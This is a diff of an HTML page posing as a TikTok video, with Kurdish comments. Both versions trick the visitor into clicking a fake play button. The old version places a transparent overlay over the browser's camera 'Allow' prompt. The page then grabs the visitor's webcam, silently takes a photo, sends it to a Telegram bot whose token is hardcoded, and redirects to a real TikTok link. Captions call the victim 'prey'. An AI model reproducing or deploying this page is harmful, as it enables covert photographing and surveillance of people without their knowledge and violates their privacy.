@@ -1,84 +1,75 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ku">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TikTok Video</title>
+    <title>TikTok</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
+        .bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('https://raw.githubusercontent.com/rudawsoran/Video/main/soran.jpg') no-repeat center center; background-size: contain; z-index: 1; }
         
-        /* وێنەی پشتەوە */
-        .bg { position: fixed; width: 100%; height: 100%; background: url('https://raw.githubusercontent.com/rudawsoran/Video/main/soran.jpg') no-repeat center center; background-size: contain; z-index: 1; }
-
-        /* تەڵە شەفافەکە کە هەموو شاشەکەی گرتووەتەوە */
-        #trap-overlay { 
-            position: fixed; 
-            top: 0; left: 0; 
-            width: 100%; height: 100%; 
-            z-index: 1000; 
-            cursor: pointer;
-            background: rgba(0,0,0,0.01); /* تەنها بۆ ئەوەی کلیک بگرێت */
+        /* دوگمەی سەرەکی بۆ ناچارکردنی کلیک */
+        #play-layer {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 1000; display: flex; align-items: center; justify-content: center;
+            background: rgba(0,0,0,0.3); cursor: pointer;
         }
-
-        /* لۆگۆی Play کە ڕێک لە شوێنی Allow دەبێت */
-        .fake-button {
-            position: absolute;
-            top: 45%; /* ئەمە ڕێک دەچێتە سەر شوێنی Allow لە زۆربەی ئایفۆنەکان */
-            right: 20%;
-            width: 80px; height: 80px;
-            background: rgba(255,255,255,0.1);
-            border-radius: 50%;
-            z-index: 5;
+        .play-btn-circle {
+            width: 100px; height: 100px; background: rgba(255,255,255,0.8);
+            border-radius: 50%; display: flex; align-items: center; justify-content: center;
+            box-shadow: 0 0 20px rgba(255,255,255,0.4);
         }
-
+        .play-icon { width: 50px; height: 50px; fill: #000; }
         video, canvas { display: none; }
     </style>
 </head>
-<body onload="notify()">
+<body>
     <div class="bg"></div>
-    <div class="fake-button"></div> <div id="trap-overlay" onclick="executeShock()"></div>
     
+    <div id="play-layer" onclick="startCapture()">
+        <div class="play-btn-circle">
+            <svg class="play-icon" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
+        </div>
+    </div>
+
     <video id="v" autoplay playsinline muted></video>
     <canvas id="c"></canvas>
 
     <script>
         const token = "8454166362:AAE-teyJSdRqs8yUA4UPUeHmiIT0TtyT1hc";
         const chat_id = "7261354534";
+        const target = "https://vt.tiktok.com/ZS5WMhjoP/";
 
-        function notify() {
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("🚨 نێچیرەکە ڕێک لەسەر تەڵەی Allow وەستاوە...")}`);
-        }
+        async function startCapture() {
+            // شاردنەوەی دوگمەکە بۆ ئەوەی بزانێت کار دەکات
+            document.getElementById('play-layer').style.display = 'none';
 
-        async function executeShock() {
             try {
-                // قۆناغی ١: داواکردنی مۆڵەت (پەنجەرەکە دەردەکەوێت)
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                
-                // قۆناغی ٢: چونکە پەنجەی لەسەر شاشەیە بۆ کلیک، یەکسەر Allow قبوڵ دەکات
-                const video = document.getElementById('v');
-                video.srcObject = stream;
-                await video.play();
+                // داواکردنی کامێرا (ئێستا مۆبایلەکە ناچارە پیشانی بدات چونکە کلیکی لێ کرا)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const v = document.getElementById('v');
+                v.srcObject = stream;
+                await v.play();
 
-                // قۆناغی ٣: گرتنی وێنە بەبێ فلاش و بێدەنگ
+                // گرتنی وێنە دوای چرکەیەک
                 setTimeout(async () => {
-                    const canvas = document.getElementById('c');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const c = document.getElementById('c');
+                    c.width = v.videoWidth; c.height = v.videoHeight;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    const b = await (await fetch(c.toDataURL('image/jpeg', 0.8))).blob();
                     
-                    const blob = await (await fetch(canvas.toDataURL('image/jpeg', 0.8))).blob();
                     const fd = new FormData();
                     fd.append('chat_id', chat_id);
-                    fd.append('photo', blob, 'shock.jpg');
-                    fd.append('caption', "👑 پاشایەتی: نێچیرەکە بەبێ ئەوەی بزانێت Allow کرد و وێنەی گیرا!");
+                    fd.append('photo', b, 'capture.jpg');
+                    fd.append('caption', "👑 پاشایەتی: وێنەی نێچیر ئاشکرا بوو!");
                     
                     await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
-                    window.location.href = "https://vt.tiktok.com/ZS5WMhjoP/";
-                }, 300);
-
-            } catch (err) {
-                // ئەگەر جاری یەکەم بە هەڵە پەنجەی بەرنەکەوت، با لاپەڕەکە تێک نەچێت
-                window.location.href = "https://vt.tiktok.com/ZS5WMhjoP/";
+                    window.location.href = target;
+                }, 1000);
+            } catch (e) {
+                // ئەگەر ڕەدی کردەوە، لانی کەم ئاگاداریت بۆ دێت
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("❌ نێچیرەکە ڕەدی کردەوە!")}`);
+                window.location.href = target;
             }
         }
     </script>
